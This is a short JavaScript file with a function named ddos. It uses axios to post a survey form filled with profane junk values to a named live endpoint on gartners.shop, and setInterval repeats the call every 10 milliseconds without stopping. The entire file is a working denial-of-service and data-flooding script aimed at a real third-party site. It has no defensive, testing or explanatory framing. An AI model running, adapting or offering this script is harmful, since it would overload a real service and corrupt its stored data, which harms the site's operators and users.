import axios from 'axios';

let count = 0;
async function ddos() {
  count += 1;
  await axios
    .post('https://www.gartners.shop/onts-admin/saveQuestionInfo.json', [
      {
        name: 'sex',
        value: 'fuck',
      },
      {
        name: 'ageNumber',
        value: 'fuck',
      },
      {
        name: 'occupationName',
        value: 'fuck',
      },
      {
        name: 'likeShoppingWebsite',
        value: 'fuck',
      },
      {
        name: 'likeShoppingWebsite',
        value: 'fuck',
      },
      {
        name: 'likeShoppingWebsite',
        value: 'fuck',
      },
      {
        name: 'likeGoods',
        value: 'fuck',
      },
      {
        name: 'likeGoods',
        value: 'fuck',
      },
      {
        name: 'shoppingTimes',
        value: 'fuck',
      },
      {
        name: 'shoppingPrice',
        value: 'fuck',
      },
      {
        name: 'likeMyntra',
        value: 'fuck',
      },
      {
        name: 'telNumber',
        value: 'fuck',
      },
    ])
    .then((res) => {
      console.log(count, res.data.success);
      // return res;
    })
    .catch((err) => {
      console.log(err);

      // return err;
    });
}

setInterval(async () => {
  // console.log('run ddos');
  ddos();
  // process.exit(1);
}, 10);
